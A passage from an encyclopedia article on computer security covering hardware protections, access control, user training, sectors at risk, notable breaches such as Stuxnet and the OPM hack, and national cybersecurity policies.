 (TPMs) secure devices by integrating cryptographic capabilities onto access devices, through the use of microprocessors, or so-called computers-on-a-chip. TPMs used in conjunction with server-side software offer a way to detect and authenticate hardware devices, preventing unauthorized network and data access.
[
75
]


Computer case intrusion detection
 refers to a device, typically a push-button switch, which detects when a computer case is opened. The firmware or BIOS is programmed to show an alert to the operator when the computer is booted up the next time.


Drive locks are essentially software tools to encrypt hard drives, making them inaccessible to thieves.
[
76
]
 Tools exist specifically for encrypting external drives as well.
[
77
]


Disabling USB ports is a security option for preventing unauthorized and malicious access to an otherwise secure computer. Infected USB dongles connected to a network from a computer inside the firewall are considered by the magazine Network World as the most common hardware threat facing computer networks.


Disconnecting or disabling peripheral devices (like camera, GPS, removable storage, etc.), that are not in use.
[
78
]


Mobile-enabled access devices are growing in popularity due to the ubiquitous nature of cell phones.
[
79
]
 Built-in capabilities such as 
Bluetooth
, the newer 
Bluetooth low energy
 (LE), 
near-field communication
 (NFC) on non-iOS devices and 
biometric
 validation such as thumbprint readers, as well as 
QR code
 reader software designed for mobile devices, offer new, secure ways for mobile phones to connect to access control systems. These control systems provide computer security and can also be used for controlling access to secure buildings.
[
80
]


IOMMUs
 allow for hardware-based 
sandboxing
 of components in mobile and desktop computers by utilizing 
direct memory access
 protections.
[
81
]
[
82
]


Physical Unclonable Functions
 (PUFs) can be used as a digital fingerprint or a unique identifier to integrated circuits and hardware, providing users the ability to secure the hardware supply chains going into their systems.
[
83
]
[
84
]


Secure operating systems
[
edit
]


Main article: 
Security-evaluated operating system


One use of the term 
computer security
 refers to technology that is used to implement 
secure operating systems
. Using secure operating systems is a good way of ensuring computer security. These are systems that have achieved certification from an external security-auditing organization, the most popular evaluations are 
Common Criteria
 (CC).
[
85
]




Secure coding
[
edit
]


Main article: 
Secure coding


In software engineering, 
secure coding
 aims to guard against the accidental introduction of security vulnerabilities. It is also possible to create software designed from the ground up to be secure. Such systems are 
secure by design
. Beyond this, formal verification aims to prove the 
correctness
 of the 
algorithms
 underlying a system;
[
86
]

important for 
cryptographic protocols
 for example.



Capabilities and access control lists
[
edit
]


Main articles: 
Access control list
, 
Role-based access control
, and 
Capability-based security


Within computer systems, two of the main 
security models
 capable of enforcing privilege separation are 
access control lists
 (ACLs) and 
role-based access control
 (RBAC).

An 
access-control list
 (ACL), with respect to a computer file system, is a list of permissions associated with an object. An ACL specifies which users or system processes are granted access to objects, as well as what operations are allowed on given objects.

Role-based access control is an approach to restricting system access to authorized users,
[
87
]
[
88
]
[
89
]
  used by the majority of enterprises with more than 500 employees,
[
90
]
 and can implement 
mandatory access control
 (MAC) or 
discretionary access control
 (DAC).

A further approach, 
capability-based security
 has been mostly restricted to research operating systems. Capabilities can, however, also be implemented at the language level, leading to a style of programming that is essentially a refinement of standard object-oriented design. An open-source project in the area is the 
E language
.



User security training
[
edit
]


The end-user is widely recognized as the weakest link in the security chain
[
91
]
 and it is estimated that more than 90% of security incidents and breaches involve some kind of human error.
[
92
]
[
93
]
 Among the most commonly recorded forms of errors and misjudgment are poor password management, sending emails containing sensitive data and attachments to the wrong recipient, the inability to recognize misleading URLs and to identify fake websites and dangerous email attachments.  A common mistake that users make is saving their user id/password in their browsers to make it easier to log in to banking sites.  This is a gift to attackers who have obtained access to a machine by some means.  The risk may be mitigated by the use of two-factor authentication.
[
94
]


As the human component of cyber risk is particularly relevant in determining the global cyber risk
[
95
]
 an organization is facing, security awareness training, at all levels, not only provides formal compliance with regulatory and industry mandates but is considered essential
[
96
]
 in reducing cyber risk and protecting individuals and companies from the great majority of cyber threats.

The focus on the end-user represents a profound cultural change for many security practitioners, who have traditionally approached cybersecurity exclusively from a technical perspective, and moves along the lines suggested by major security centers
[
97
]
 to develop a culture of cyber awareness within the organization, recognizing that a security-aware user provides an important line of defense against cyber attacks.



Digital hygiene
[
edit
]


Related to end-user training, 
digital hygiene
 or 
cyber hygiene
 is a fundamental principle relating to information security and, as the analogy with 
personal hygiene
 shows, is the equivalent of establishing simple routine measures to minimize the risks from cyber threats. The assumption is that good cyber hygiene practices can give networked users another layer of protection, reducing the risk that one vulnerable node will be used to either mount attacks or compromise another node or network, especially from common cyberattacks.
[
98
]
 Cyber hygiene should also not be mistaken for 
proactive cyber defence
, a military term.
[
99
]


The most common acts of digital hygiene can include updating malware protection, cloud back-ups, passwords, and ensuring restricted admin rights and network firewalls.
[
100
]
 As opposed to a purely technology-based defense against threats, cyber hygiene mostly regards routine measures that are technically simple to implement and mostly dependent on discipline
[
101
]
 or education.
[
102
]
 It can be thought of as an abstract list of tips or measures that have been demonstrated as having a positive effect on personal or collective digital security. As such, these measures can be performed by laypeople, not just security experts.

Cyber hygiene relates to personal hygiene as computer viruses relate to biological viruses (or pathogens). However, while the term 
computer virus
 was coined almost simultaneously with the creation of the first working computer viruses,
[
103
]
 the term 
cyber hygiene
 is a much later invention, perhaps as late as 2000
[
104
]
 by Internet pioneer 
Vint Cerf
. It has since been adopted by the 
Congress
[
105
]
 and 
Senate
 of the United States,
[
106
]
 the FBI,
[
107
]
 
EU
 institutions
[
98
]
 and heads of state.
[
99
]




Difficulty of responding to breaches
[
edit
]


Responding to attempted 
security breaches
 is often very difficult for a variety of reasons, including:



Identifying attackers is difficult, as they may operate through proxies, temporary anonymous dial-up accounts, wireless connections, and other anonymizing procedures which make back-tracing difficult – and are often located in another 
jurisdiction
. If they successfully breach security, they have also often gained enough administrative access to enable them to delete 
logs
 to cover their tracks.


The sheer number of attempted attacks, often by automated vulnerability scanners and computer worms, is so large that organizations cannot spend time pursuing each.


Law enforcement officers
 often lack the skills, interest or budget to pursue attackers. Furthermore, identifying attackers across a network may necessitate collecting logs from multiple locations within the network and across various countries, a process that can be both difficult and time-consuming.


Where an attack succeeds and a breach occurs, many jurisdictions now have in place mandatory 
security breach notification laws
.



Types of security and privacy
[
edit
]




Access control


Anti-keyloggers


Anti-malware


Anti-spyware


Anti-subversion software


Anti-tamper software


Anti-theft


Antivirus software


Cryptographic software


Computer-aided dispatch
 (CAD)


Data loss prevention software


Firewall


Intrusion detection system
 (IDS)


Intrusion prevention system
 (IPS)


Log management software


Parental control


Records management


Sandbox


Security information management


Security information and event management
 (SIEM)


Software and operating system updating


Vulnerability Management




Systems at risk
[
edit
]


The growth in the number of computer systems and the increasing reliance upon them by individuals, businesses, industries, and governments means that there are an increasing number of systems at risk.



Financial systems
[
edit
]


The computer systems of financial regulators and financial institutions like the 
U.S. Securities and Exchange Commission
, SWIFT, investment banks, and commercial banks are prominent hacking targets for 
cybercriminals
 interested in manipulating markets and making illicit gains.
[
108
]
 Websites and apps that accept or store 
credit card numbers
, brokerage accounts, and 
bank account
 information are also prominent hacking targets, because of the potential for immediate financial gain from transferring money, making purchases, or selling the information on the 
black market
.
[
109
]
 In-store payment systems and 
ATMs
 have also been tampered with in order to gather customer account data and 
PINs
.

The 
UCLA
 Internet Report: Surveying the Digital Future (2000) found that the privacy of personal data created barriers to online sales and that more than nine out of 10 internet users were somewhat or very concerned about 
credit card
 security.
[
110
]


The most common web technologies for improving security between browsers and websites are named SSL (Secure Sockets Layer), and its successor TLS (
Transport Layer Security
), 
identity management
 and 
authentication
 services, and 
domain name
 services allow companies and consumers to engage in secure communications and commerce. Several versions of SSL and TLS are commonly used today in applications such as web browsing, e-mail, internet faxing, 
instant messaging
, and 
VoIP
 (voice-over-IP). There are various 
interoperable
 implementations of these technologies, including at least one implementation that is 
open source
. Open source allows anyone to view the application's 
source code
, and look for and report vulnerabilities.

The credit card companies 
Visa
 and 
MasterCard
 cooperated to develop the secure 
EMV
 chip which is embedded in credit cards. Further developments include the 
Chip Authentication Program
 where banks give customers hand-held card readers to perform online secure transactions. Other developments in this arena include the development of technology such as Instant Issuance which has enabled shopping 
mall kiosks
 acting on behalf of banks to issue on-the-spot credit cards to interested customers.



Utilities and industrial equipment
[
edit
]


Computers control functions at many utilities, including coordination of 
telecommunications
, the 
power grid
, 
nuclear power plants
, and valve opening and closing in water and gas networks. The Internet is a potential attack vector for such machines if connected, but the 
Stuxnet
 worm demonstrated that even equipment controlled by computers not connected to the Internet can be vulnerable. In 2014, the 
Computer Emergency Readiness Team
, a division of the 
Department of Homeland Security
, investigated 79 hacking incidents at energy companies.
[
111
]




Aviation
[
edit
]


The 
aviation
 industry is very reliant on a series of complex systems which could be attacked.
[
112
]
 A simple power outage at one airport can cause repercussions worldwide,
[
113
]
 much of the system relies on radio transmissions which could be disrupted,
[
114
]
 and controlling aircraft over oceans is especially dangerous because radar surveillance only extends 175 to 225 miles offshore.
[
115
]
 There is also potential for attack from within an aircraft.
[
116
]


Implementing fixes in aerospace systems poses a unique challenge because efficient air transportation is heavily affected by weight and volume. Improving security by adding physical devices to airplanes could increase their unloaded weight, and could potentially reduce cargo or passenger capacity.
[
117
]


In Europe, with the (
Pan-European Network Service
)
[
118
]
 and NewPENS,
[
119
]
 and in the US with the NextGen program,
[
120
]
 
air navigation service providers
 are moving to create their own dedicated networks.

Many modern passports are now 
biometric passports
, containing an embedded 
microchip
 that stores a digitized photograph and personal information such as name, gender, and date of birth. In addition, more countries
[
which?
]
 are introducing 
facial recognition technology
 to reduce 
identity-related fraud
. The introduction of the ePassport has assisted border officials in verifying the identity of the passport holder, thus allowing for quick passenger processing.
[
121
]
 Plans are under way in the US, the 
UK
, and 
Australia
 to introduce SmartGate kiosks with both retina and 
fingerprint recognition
 technology.
[
122
]
 The airline industry is moving from the use of traditional paper tickets towards the use of 
electronic tickets
 (e-tickets). These have been made possible by advances in online credit card transactions in partnership with the airlines. Long-distance bus companies
[
which?
]
 are also switching over to e-ticketing transactions today.

The consequences of a successful attack range from loss of confidentiality to loss of system integrity, 
air traffic control
 outages, loss of aircraft, and even loss of life.



Consumer devices
[
edit
]


Desktop computers and laptops are commonly targeted to gather passwords or financial account information or to construct a botnet to attack another target. 
Smartphones
, 
tablet computers
, 
smart watches
, and other 
mobile devices
 such as 
quantified self
 devices like 
activity trackers
 have sensors such as cameras, microphones, GPS receivers, compasses, and 
accelerometers
 which could be exploited, and may collect personal information, including sensitive health information. WiFi, Bluetooth, and cell phone networks on any of these devices could be used as attack vectors, and sensors might be remotely activated after a successful breach.
[
123
]


The increasing number of 
home automation
 devices such as the 
Nest thermostat
 are also potential targets.
[
123
]




Healthcare
[
edit
]


Today many healthcare providers and 
health insurance
 companies use the internet to provide enhanced products and services, for example through use of 
tele-health
 to potentially offer better quality and access to healthcare, or fitness trackers to lower insurance premiums.

The health care company 
Humana
 partners with 
WebMD
, 
Oracle Corporation
, 
EDS
 and 
Microsoft
 to enable its members to access their health care records, as well as to provide an overview of health care plans.
[
124
]
 Patient records are increasingly being placed on secure in-house networks, alleviating the need for extra storage space.
[
125
]




Large corporations
[
edit
]


Large corporations are common targets. In many cases attacks are aimed at financial gain through 
identity theft
 and involve 
data breaches
. Examples include the loss of millions of clients' credit card and financial details by 
Home Depot
,
[
126
]
 
Staples
,
[
127
]
 
Target Corporation
,
[
128
]
 and 
Equifax
.
[
129
]


Medical records have been targeted in general identify theft, health insurance fraud, and impersonating patients to obtain prescription drugs for recreational purposes or resale.
[
130
]
 Although cyber threats continue to increase, 62% of all organizations did not increase security training for their business in 2015.
[
131
]


Not all attacks are financially motivated, however: security firm 
HBGary Federal
 had a serious series of attacks in 2011 from 
hacktivist
 group 
Anonymous
 in retaliation for the firm's CEO claiming to have infiltrated their group,
[
132
]
[
133
]
 and 
Sony Pictures
 was 
hacked in 2014
 with the apparent dual motive of embarrassing the company through data leaks and crippling the company by wiping workstations and servers.
[
134
]
[
135
]




Automobiles
[
edit
]


See also: 
Autonomous car § Potential disadvantages
, 
Automated driving system § Risks and liabilities
, and 
Automotive hacking


Vehicles are increasingly computerized, with engine timing, 
cruise control
, 
anti-lock brakes
, seat belt tensioners, door locks, 
airbags
 and 
advanced driver-assistance systems
 on many models. Additionally, 
connected cars
 may use WiFi and Bluetooth to communicate with onboard consumer devices and the cell phone network.
[
136
]
 
Self-driving cars
 are expected to be even more complex. All of these systems carry some security risks, and such issues have gained wide attention.
[
137
]
[
138
]
[
139
]


Simple examples of risk include a malicious 
compact disc
 being used as an attack vector,
[
140
]
 and the car's onboard microphones being used for eavesdropping. However, if access is gained to a car's internal 
controller area network
, the danger is much greater
[
136
]
 – and in a widely publicized 2015 test, hackers remotely carjacked a vehicle from 10 miles away and drove it into a ditch.
[
141
]
[
142
]


Manufacturers are reacting in numerous ways, with 
Tesla
 in 2016 pushing out some security fixes 
over the air
 into its cars' computer systems.
[
143
]
 In the area of autonomous vehicles, in September 2016 the 
United States Department of Transportation
 announced some initial safety standards, and called for states to come up with uniform policies.
[
144
]
[
145
]
[
146
]


Additionally, e-Drivers' licenses are being developed using the same technology. For example, Mexico's licensing authority (ICV) has used a smart card platform to issue the first e-Drivers' licenses to the city of 
Monterrey
, in the state of 
Nuevo León
.
[
147
]




Shipping
[
edit
]


Shipping companies
[
148
]
 have adopted 
RFID
 (Radio Frequency Identification) technology as an efficient, digitally secure, 
tracking device
. Unlike a 
barcode
, RFID can be read up to 20 feet away. RFID is used by 
FedEx
[
149
]
 and 
UPS
.
[
150
]




Government
[
edit
]


Government and 
military
 computer systems are commonly attacked by activists
[
151
]
[
152
]
[
153
]
 and foreign powers.
[
154
]
[
155
]
[
156
]
[
157
]
 Local and regional government infrastructure such as 
traffic light
 controls, police and intelligence agency communications, 
personnel records
, as well as student records.
[
158
]


The 
FBI
, 
CIA
, and 
Pentagon
, all utilize secure controlled access technology for any of their buildings. However, the use of this form of technology is spreading into the entrepreneurial world. More and more companies are taking advantage of the development of digitally secure controlled access technology. GE's ACUVision, for example, offers a single panel platform for access control, alarm monitoring and digital recording.
[
159
]




Internet of things and physical vulnerabilities
[
edit
]


The 
Internet of things
 (IoT) is the network of physical objects such as devices, vehicles, and buildings that are 
embedded
 with 
electronics
, 
software
, 
sensors
, and 
network connectivity
 that enables them to collect and exchange data.
[
160
]
 Concerns have been raised that this is being developed without appropriate consideration of the security challenges involved.
[
161
]
[
162
]


While the IoT creates opportunities for more direct integration of the physical world into computer-based systems,
[
163
]
[
164
]

it also provides opportunities for misuse. In particular, as the Internet of Things spreads widely, cyberattacks are likely to become an increasingly physical (rather than simply virtual) threat.
[
165
]
 If a front door's lock is connected to the Internet, and can be locked/unlocked from a phone, then a criminal could enter the home at the press of a button from a stolen or hacked phone. People could stand to lose much more than their credit card numbers in a world controlled by IoT-enabled devices. Thieves have also used electronic means to circumvent non-Internet-connected hotel door locks.
[
166
]


An attack aimed at physical infrastructure or human lives is often called a cyber-kinetic attack. As IoT devices and appliances become more widespread, the prevalence and potential damage of cyber-kinetic attacks can increase substantially.



Medical systems
[
edit
]


See also: 
Medical device hijack
 and 
Medical data breach


Medical devices
 have either been successfully attacked or had potentially deadly vulnerabilities demonstrated, including both in-hospital diagnostic equipment
[
167
]
 and implanted devices including 
pacemakers
[
168
]
 and 
insulin pumps
.
[
169
]
 There are many reports of hospitals and hospital organizations getting hacked, including 
ransomware
 attacks,
[
170
]
[
171
]
[
172
]
[
173
]
 
Windows XP
 exploits,
[
174
]
[
175
]
 viruses,
[
176
]
[
177
]
 and data breaches of sensitive data stored on hospital servers.
[
178
]
[
171
]
[
179
]
[
180
]
 On 28 December 2016 the US 
Food and Drug Administration
 released its recommendations for how medical 
device manufacturers
 should maintain the security of Internet-connected devices – but no structure for enforcement.
[
181
]
[
182
]




Energy sector
[
edit
]


In distributed generation systems, the risk of a cyber attack is real, according to 
Daily Energy Insider
. An attack could cause a loss of power in a large area for a long period of time, and such an attack could have just as severe consequences as a natural disaster. The District of Columbia is considering creating a Distributed Energy Resources (DER) Authority within the city, with the goal being for customers to have more insight into their own energy use and giving the local electric utility, 
Pepco
, the chance to better estimate energy demand. The D.C. proposal, however, would "allow third-party vendors to create numerous points of energy distribution, which could potentially create more opportunities for cyber attackers to threaten the electric grid."
[
183
]




Telecommunications
[
edit
]


Perhaps the most widely known digitally secure telecommunication device is the 
SIM
 (Subscriber Identity Module) card, a device that is embedded in most of the world's cellular devices before any service can be obtained. The SIM card is just the beginning of this digitally secure environment.

The Smart Card Web Servers draft standard (SCWS) defines the interfaces to an 
HTTP server
 in a 
smart card
.
[
184
]
 Tests are being conducted to secure OTA ("over-the-air") payment and credit card information from and to a mobile phone. 
Combination SIM/DVD devices are being developed through Smart Video Card technology which embeds a 
DVD
-compliant 
optical disc
 into the card body of a regular SIM card.

Other telecommunication developments involving digital security include 
mobile signatures
, which use the embedded SIM card to generate a legally binding 
electronic signature
.



Cost and impact of security breaches
[
edit
]


Serious financial damage has been caused by 
security breaches
, but because there is no standard model for estimating the cost of an incident, the only data available is that which is made public by the organizations involved. "Several computer security consulting firms produce estimates of total worldwide losses attributable to 
virus
 and worm attacks and to hostile digital acts in general. The 2003 loss estimates by these firms range from $13 billion (worms and viruses only) to $226 billion (for all forms of covert attacks). The reliability of these estimates is often challenged; the underlying methodology is basically anecdotal."
[
185
]


However, reasonable estimates of the financial cost of security breaches can actually help organizations make rational investment decisions. According to the classic 
Gordon-Loeb Model
 analyzing the optimal investment level in information security, one can conclude that the amount a firm spends to protect information should generally be only a small fraction of the expected loss (i.e., the 
expected value
 of the loss resulting from a cyber/information 
security breach
).
[
186
]




Attacker motivation
[
edit
]


As with 
physical security
, the motivations for breaches of computer security vary between attackers. Some are thrill-seekers or 
vandals
, some are activists, others are criminals looking for financial gain. State-sponsored attackers are now common and well resourced but started with amateurs such as Markus Hess who hacked for the 
KGB
, as recounted by 
Clifford Stoll
 in 
The Cuckoo's Egg
.

Attackers motivations can vary for all types of attacks from pleasure to political goals.
[
15
]
 For example, "hacktivists" may target a company or organization that carries out activities they do not agree with. This would be to create bad publicity for the company by having its website crash.

High capability hackers, often with larger backing or state sponsorship, may attack based on the demands of their financial backers. These attacks are more likely to attempt more serious attack. An example of a more serious attack was the 
2015 Ukraine power grid hack
, which reportedly utilised the spear-phising, destruction of files, and denial-of-service attacks to carry out the full attack.
[
187
]
[
188
]


Additionally, recent attacker motivations can be traced back to extremist organizations seeking to gain political advantage or disrupt social agendas.
[
189
]
 The growth of the internet, mobile technologies, and inexpensive computing devices have led to a rise in capabilities but also to the risk to environments that are deemed as vital to operations. All critical targeted environments are susceptible to compromise and this has led to a series of proactive studies on how to migrate the risk by taking into consideration motivations by these types of actors. Several stark differences exist between the hacker motivation and that of 
nation state
 actors seeking to attack based on an ideological preference.
[
190
]


A key aspect of threat modeling for any system is identifying the motivations behind potential attacks and the individuals or groups likely to carry them out. The level and detail of security measures will differ based on the specific system being protected. For instance, a home personal computer, a bank, and a classified military network each face distinct threats, despite using similar underlying technologies.
[
191
]




Computer security incident management
[
edit
]


Computer security incident management
 is an organized approach to addressing and managing the aftermath of a computer security incident or compromise with the goal of preventing a breach or thwarting a cyberattack. An incident that is not identified and managed at the time of intrusion typically escalates to a more damaging event such as a 
data breach
 or system failure. The intended outcome of a computer security incident response plan is to contain the incident, limit damage and assist recovery to business as usual. Responding to compromises quickly can mitigate exploited vulnerabilities, restore services and processes and minimize losses.
[
192
]

Incident response planning allows an organization to establish a series of best practices to stop an intrusion before it causes damage. Typical incident response plans contain a set of written instructions that outline the organization's response to a cyberattack. Without a documented plan in place, an organization may not successfully detect an intrusion or compromise and stakeholders may not understand their roles, processes and procedures during an escalation, slowing the organization's response and resolution.

There are four key components of a computer security incident response plan:



Preparation: Preparing stakeholders on the procedures for handling computer security incidents or compromises


Detection and analysis: Identifying and investigating suspicious activity to confirm a security incident, prioritizing the response based on impact and coordinating notification of the incident


Containment, eradication and recovery: Isolating affected systems to prevent escalation and limit impact, pinpointing the genesis of the incident, removing malware, affected systems and bad actors from the environment and restoring systems and data when a threat no longer remains


Post incident activity: Post mortem analysis of the incident, its root cause and the organization's response with the intent of improving the incident response plan and future response efforts.
[
193
]


Notable attacks and breaches
[
edit
]


Further information: 
List of cyber-attacks
 and 
List of data breaches


Some illustrative examples of different types of computer security breaches are given below.



Robert Morris and the first computer worm
[
edit
]


Main article: 
Morris worm


In 1988, 60,000 computers were connected to the Internet, and most were mainframes, minicomputers and professional workstations. On 2 November 1988, many started to slow down, because they were running a malicious code that demanded processor time and that spread itself to other computers – the first internet 
computer worm
.
[
194
]
 The software was traced back to 23-year-old 
Cornell University
 graduate student 
Robert Tappan Morris
 who said "he wanted to count how many machines were connected to the Internet".
[
194
]




Rome Laboratory
[
edit
]


In 1994, over a hundred intrusions were made by unidentified crackers into the 
Rome Laboratory
, the US Air Force's main command and research facility. Using 
trojan horses
, hackers were able to obtain unrestricted access to Rome's networking systems and remove traces of their activities. The intruders were able to obtain classified files, such as air tasking order systems data and furthermore able to penetrate connected networks of 
National Aeronautics and Space Administration
's Goddard Space Flight Center, Wright-Patterson Air Force Base, some Defense contractors, and other private sector organizations, by posing as a trusted Rome center user.
[
195
]




TJX customer credit card details
[
edit
]


In early 2007, American apparel and home goods company 
TJX
 announced that it was the victim of an 
unauthorized computer systems intrusion
[
196
]
 and that the hackers had accessed a system that stored data on 
credit card
, 
debit card
, 
check
, and merchandise return transactions.
[
197
]




Stuxnet attack
[
edit
]


In 2010, the computer worm known as 
Stuxnet
 reportedly ruined almost one-fifth of Iran's 
nuclear centrifuges
.
[
198
]
 It did so by disrupting industrial 
programmable logic controllers
 (PLCs) in a targeted attack. This is generally believed to have been launched by Israel and the United States to disrupt Iran's nuclear program
[
199
]
[
200
]
[
201
]
[
202
]
 – although neither has publicly admitted this.



Global surveillance disclosures
[
edit
]


Main article: 
Global surveillance disclosures (2013–present)


In early 2013, documents provided by 
Edward Snowden
 were published by 
The Washington Post
 and 
The Guardian
[
203
]
[
204
]
 exposing the massive scale of 
NSA
 global surveillance. There were also indications that the NSA may have inserted a backdoor in a 
NIST
 standard for encryption.
[
205
]
 This standard was later withdrawn due to widespread criticism.
[
206
]
 The NSA additionally were revealed to have tapped the links between 
Google
's data centers.
[
207
]




Target and Home Depot breaches
[
edit
]


A Ukrainian hacker known as 
Rescator
 broke into 
Target Corporation
 computers in 2013, stealing roughly 40 million credit cards,
[
208
]
 and then 
Home Depot
 computers in 2014, stealing between 53 and 56 million credit card numbers.
[
209
]
 Warnings were delivered at both corporations, but ignored; physical security breaches using 
self checkout machines
 are believed to have played a large role. "The malware utilized is absolutely unsophisticated and uninteresting," says Jim Walter, director of threat intelligence operations at security technology company McAfee – meaning that the heists could have easily been stopped by existing 
antivirus software
 had administrators responded to the warnings. The size of the thefts has resulted in major attention from state and Federal United States authorities and the investigation is ongoing.



Office of Personnel Management data breach
[
edit
]


In April 2015, the 
Office of Personnel Management
 
discovered it had been hacked
 more than a year earlier in a data breach, resulting in the theft of approximately 21.5 million personnel records handled by the office.
[
210
]
 The Office of Personnel Management hack has been described by federal officials as among the largest breaches of government data in the history of the United States.
[
211
]
 Data targeted in the breach included 
personally identifiable information
 such as 
Social Security numbers
, names, dates and places of birth, addresses, and fingerprints of current and former government employees as well as anyone who had undergone a government background check.
[
212
]
[
213
]
 It is believed the hack was perpetrated by Chinese hackers.
[
214
]




Ashley Madison breach
[
edit
]


Main article: 
Ashley Madison Data Breach


In July 2015, a hacker group is known as The Impact Team successfully breached the extramarital relationship website Ashley Madison, created by Avid Life Media. The group claimed that they had taken not only company data but user data as well. After the breach, The Impact Team dumped emails from the company's CEO, to prove their point, and threatened to dump customer data unless the website was taken down permanently.
[
215
]
 When Avid Life Media did not take the site offline the group released two more compressed files, one 9.7GB and the second 20GB. After the second data dump, Avid Life Media CEO Noel Biderman resigned; but the website remained to function.



Colonial Pipeline ransomware attack
[
edit
]


Main article: 
Colonial Pipeline ransomware attack


In June 2021, the cyber attack took down the largest fuel pipeline in the U.S. and led to shortages across the East Coast.
[
216
]




Legal issues and global regulation
[
edit
]


International legal issues of cyber attacks are complicated in nature. There is no global base of common rules to judge, and eventually punish, cybercrimes and cybercriminals - and where security firms or agencies do locate the cybercriminal behind the creation of a particular piece of 
malware
 or form of 
cyber attack
, often the local authorities cannot take action due to lack of laws under which to prosecute.
[
217
]
[
218
]
 Proving 
attribution for cybercrimes and cyberattacks
 is also a major problem for all law enforcement agencies. "
Computer viruses
 switch from one country to another, from one jurisdiction to another – moving around the world, using the fact that we don't have the capability to globally police operations like this. So the Internet is as if someone [had] given free plane tickets to all the online criminals of the world."
[
217
]
 The use of techniques such as 
dynamic DNS
, 
fast flux
 and 
bullet proof servers
 add to the difficulty of investigation and enforcement.



Role of government
[
edit
]


The role of the government is to make 
regulations
 to force companies and organizations to protect their systems, infrastructure and information from any cyberattacks, but also to protect its own national infrastructure such as the national 
power-grid
.
[
219
]


The government's regulatory role in 
cyberspace
 is complicated. For some, cyberspace was seen as a 
virtual space
 that was to remain free of government intervention, as can be seen in many of today's libertarian 
blockchain
 and 
bitcoin
 discussions.
[
220
]


Many government officials and experts think that the government should do more and that there is a crucial need for improved regulation, mainly due to the failure of the private sector to solve efficiently the cybersecurity problem. 
R. Clarke
 said during a panel discussion at the 
RSA Security Conference
 in 
San Francisco
, he believes that the "industry only responds when you threaten regulation. If the industry doesn't respond (to the threat), you have to follow through."
[
221
]
 On the other hand, executives from the private sector agree that improvements are necessary, but think that government intervention would affect their ability to innovate efficiently. Daniel R. McCarthy analyzed this public-private partnership in cybersecurity and reflected on the role of cybersecurity in the broader constitution of political order.
[
222
]


On 22 May 2020, the UN Security Council held its second ever informal meeting on cybersecurity to focus on cyber challenges to 
international peace
. According to UN Secretary-General 
António Guterres
, new technologies are too often used to violate rights.
[
223
]




International actions
[
edit
]


Many different teams and organizations exist, including:



The Forum of Incident Response and Security Teams (FIRST) is the global association of CSIRTs.
[
224
]
 The 
US-CERT
, 
AT&T
, 
Apple
, 
Cisco
, 
McAfee
, 
Microsoft
 are all members of this international team.
[
225
]


The 
Council of Europe
 helps protect societies worldwide from the threat of cybercrime through the Convention on Cybercrime.
[
226
]


The purpose of the Messaging Anti-Abuse Working Group (MAAWG) is to bring the messaging industry together to work collaboratively and to successfully address the various forms of messaging abuse, such as spam, viruses, denial-of-service attacks and other messaging exploitations.
[
227
]
 
France Telecom
, 
Facebook
, 
AT&T
, 
Apple
, 
Cisco
, 
Sprint
 are some of the members of the MAAWG.
[
228
]


ENISA : The 
European Network and Information Security Agency
 (ENISA) is an 
agency of the European Union
 with the objective to improve network and information security in the 
European Union
.


Europe
[
edit
]


On 14 April 2016, the 
European Parliament
 and the 
Council of the European Union
 adopted the 
General Data Protection Regulation
 (GDPR). The GDPR, which came into force on 25 May 2018, grants individuals within the European Union (EU) and the European Economic Area (EEA) the right to the 
protection of personal data
. The regulation requires that any entity that processes personal data incorporate data protection by design and by default. It also requires that certain organizations appoint a Data Protection Officer (DPO).



National actions
[
edit
]


Computer emergency response teams
[
edit
]


Main article: 
Computer emergency response team


Most countries have their own computer emergency response team to protect network security.



Canada
[
edit
]


Since 2010, Canada has had a cybersecurity strategy.
[
229
]
[
230
]
 This functions as a counterpart document to the National Strategy and Action Plan for Critical Infrastructure.
[
231
]
 The strategy has three main pillars: securing government systems, securing vital private cyber systems, and helping Canadians to be secure online.
[
230
]
[
231
]
 There is also a Cyber Incident Management Framework to provide a coordinated response in the event of a cyber incident.
[
232
]
[
233
]


The 
Canadian Cyber Incident Response Centre
 (CCIRC) is responsible for mitigating and responding to threats to Canada's critical infrastructure and cyber systems. It provides support to mitigate cyber threats, technical support to respond & recover from targeted cyber attacks, and provides online tools for members of Canada's critical infrastructure sectors.
[
234
]
 It posts regular cybersecurity bulletins
[
235
]
 & operates an online reporting tool where individuals and organizations can report a cyber incident.
[
236
]


To inform the general public on how to protect themselves online, Public Safety Canada has partnered with STOP.THINK.CONNECT, a coalition of non-profit, private sector, and government organizations,
[
237
]
 and launched the Cyber Security Cooperation Program.
[
238
]
[
239
]
 They also run the GetCyberSafe portal for Canadian citizens, and Cyber Security Awareness Month during October.
[
240
]


Public Safety Canada aims to begin an evaluation of Canada's cybersecurity strategy in early 2015.
[
231
]




Australia
[
edit
]


Australian federal government
 announced an $18.2 million investment to fortify the 
cybersecurity
 resilience of small and medium enterprises (SMEs) and enhance their capabilities in responding to cyber threats. This financial backing is an integral component of the soon-to-be-unveiled 
2023-2030 Australian Cyber Security Strategy
, slated for release within the current week. A substantial allocation of $7.2 million is earmarked for the establishment of a voluntary cyber health check program, facilitating businesses in conducting a comprehensive and tailored self-assessment of their cybersecurity upskill.

This avant-garde health assessment serves as a diagnostic tool, enabling enterprises to ascertain the robustness of 
Australia's cyber security regulations
. Furthermore, it affords them access to a repository of educational resources and materials, fostering the acquisition of skills necessary for an elevated cybersecurity posture. This groundbreaking initiative was jointly disclosed by Minister for Cyber Security 
Clare O'Neil
 and Minister for Small Business 
Julie Collins
.
[
241
]




India
[
edit
]


Some provisions for cybersecurity have been incorporated into rules framed under the Information Technology Act 2000.
[
242
]


The 
National Cyber Security Policy 2013
 is a policy framework by the Ministry of Electronics and Information Technology (MeitY) which aims to protect the public and private infrastructure from cyberattacks, and safeguard "information, such as personal information (of web users), financial and banking information and sovereign data". 
CERT- In
 is the nodal agency which monitors the cyber threats in the country. The post of 
National Cyber Security Coordinator
 has also been created in the 
Prime Minister's Office (PMO)
.

The Indian Companies Act 2013 has also introduced cyber law and cybersecurity obligations on the part of Indian directors. Some provisions for cybersecurity have been incorporated into rules framed under the Information Technology Act 2000 Update in 2013.
[
243
]




South Korea
[
edit
]


Following cyberattacks in the first half of 2013, when the government, news media, television stations, and bank websites were compromised, the national government committed to the training of 5,000 new cybersecurity experts by 2017. The South Korean government blamed its northern counterpart for these attacks, as well as incidents that occurred in 2009, 2011,
[
244
]
 and 2012, but Pyongyang denies the accusations.
[
245
]




United States
[
edit
]


Cyber Plan
[
edit
]


The 
United States
 has its first fully formed cyber plan in 15 years, as a result of the release of this National Cyber plan.
[
246
